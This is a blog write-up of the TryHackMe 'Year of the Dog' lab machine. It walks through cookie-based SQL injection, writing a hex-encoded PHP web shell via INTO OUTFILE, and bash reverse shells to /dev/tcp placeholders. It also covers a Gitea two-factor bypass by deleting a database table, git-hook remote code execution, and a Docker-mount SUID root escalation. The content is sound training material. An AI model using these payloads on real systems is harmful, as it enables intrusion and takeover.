---
title: "Year of the Dog"
date: 2023-07-15T16:08:57+05:30
draft: true
toc: true
images:
tags:
  - Writeups
  - TryHackMe
---

Machine URL :: [Year of the Dog](https://tryhackme.com/room/yearofthedog)
## ENUMERATION
Nmap scan: `nmap -p- -vv <MACHINE-IP> -oG initial-scan` 
```bash
PORT STATE SERVICE REASON
22/tcp open ssh syn-ack ttl 63
80/tcp open http syn-ack ttl 63
```
SSH on port 22 and webserver on port 80 as usual.

## WEB SERVER

{{< image src="/images/dog/1.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

I used gobuster for any hidden directories but got nothing.\
### SQL INJECTION
Using burp , we see there is a cookie being stored. We could do some injection with the cookie.

{{< image src="/images/dog/2.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}


This confirms that SQLi is the way to go. UNION SELECT works.\
```sql
Cookie: id=6957bbd77dec77da95bbe62b24d2a92f' UNION SELECT 1,database() -- - 
```
gives databse `webapp`

{{< image src="/images/dog/3.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

```sql
UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema='webapp' -- -
```
gives table `queue`

```sql
UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_schema='webapp' and table_name='queue'-- -
```
gives 2 columns : `userID` and `queueNum`

Seems like we can even write to webroot using :` INTO OUTFILE '/var/www/html/`
```sql
UNION SELECT 1,'testing' INTO OUTFILE '/var/www/html/test.txt'-- -
```
gives :\
{{< image src="/images/dog/4.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}


Using Command :
```sql
UNION SELECT 1,LOAD_FILE('/etc/passwd') -- -
``` 
we got 1 user:
```plain-text
dylan:x:1000:1000:dylan,,,:/home/dylan:/bin/bash
```
As RCE detection is triggered by <? we'll have to hex encode our payload and then pass it through SQL unhex function.
```sql
UNION SELECT 1,UNHEX('3C3F7068702073797374656D28244745545B27636D64275D293B203F3E') INTO OUTFILE '/var/www/html/cmd.php' -- -
``` 
Now if it works:

{{< image src="/images/dog/5.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

It works! \
## INITIAL EXPLOIT
Now to move in , save this : 
```bash
bash -i >& /dev/tcp/<IP Address>/<PORT> 0>&1
``` 
to a file and transfer it to the webserver using :
```plain-text
<MACHINE-IP>/cmd.php?cmd=wget <YOUR-IP>:<PORT>/<file>
```
{{< image src="/images/dog/6.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

You should be in:

{{< image src="/images/dog/7.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

We are www-data. There is the user flag in dylan's home directory but we don't have the permission to read it. We can read the work_analysis file though.
In there we find Dylan's SSH password.

{{< image src="/images/dog/8.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

## FOOTHOLD

{{< image src="/images/dog/9.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Using `ifconfig`, there seems to be a docker address. We don't seem to be in a container so probably that will come later.

{{< image src="/images/dog/18.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Using LinPeas , we find `/app/gitea/gitea web` process running under dylan. Also that localhost is available on port 3000.\
Let's use SSH port forwarding and check out that port\
`ssh dylan@<MACHINE-IP> -L 3000:localhost:3000`

{{< image src="/images/dog/10.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Signing in as dylan we get a 2 factor authentication.

{{< image src="/images/dog/11.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Going back to dylan, checking `gitea` we find a db: `gitea.db` which is an SQLite3 database.

{{< image src="/images/dog/12.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Let's delete the `two_factor table` from `gitea.db`:

{{< image src="/images/dog/13.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

And we're in:

{{< image src="/images/dog/14.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

## EXPLOITATION
Now searching for any Gitea version 1.13.0 exploits , I found  [CVE-2020-14144](https://github.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce) exploit.\
In the Test-repo, we go to `settings` > `Git Hooks` > `Post Recieve Hook`.
In this hook , we can write a shell script that will get executed after getting a new commit.

Add `bash -i >& /dev/tcp/<YOUR-IP>/<CHOSEN-PORT> 0>&1 ` to Post Recieve Hook and update it.\
Start a netcat listener, then on your local machine :
```bash
git clone http://localhost:3000/Dylan/Test-repo.git
cd Test-repo
echo "something" >> README.md
git add README.md
git commit -m 'RCE'
git push
```

{{< image src="/images/dog/15.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

## PRIVILEGE ESCALATION > ROOT
Now , we're in the container confirmed by the `.dockerenv` file in `/` and we gotta break out. We can `su` rightaway.

{{< image src="/images/dog/16.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Check the `/data/` directory as the files are usually mount to host.\

This is the case here as well as the files in `/data` are identical to the `/gitea` directory in Dylan's shell.\
Now just transfer the bash file located in `/bin/` to `/data/` and add the permissions.

{{< image src="/images/dog/17.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Back at Dylan's: run `./bash -p` and you got root.

{{< image src="/images/dog/19.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}






 
 
 
 


